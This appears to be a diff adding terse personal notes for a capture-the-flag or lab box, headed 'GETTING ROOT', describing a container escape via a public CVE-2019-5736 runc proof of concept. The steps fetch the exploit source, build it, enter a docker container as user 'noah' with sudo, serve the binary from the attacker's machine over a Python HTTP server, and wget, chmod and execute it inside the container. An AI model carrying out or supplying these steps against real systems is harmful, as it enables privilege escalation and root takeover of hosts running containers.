@@ -1,0 +1,11 @@
+##################################  GETTING ROOT ################################## 
+
+1. ssh into local kali user
+2. nano main.go
+3. https://raw.githubusercontent.com/Frichetten/CVE-2019-5736-PoC/master/main.go
+4. use gtobins to set the payload
+5. go build main.go
+6. ssh into noah
+7. exec docker sudo docker exec -it webapp-dev01 bash
+8. on local: python -m SimpleHTTPServer 80
+9. on docker: wget http://local:7777/main && chmod +x main && ./main
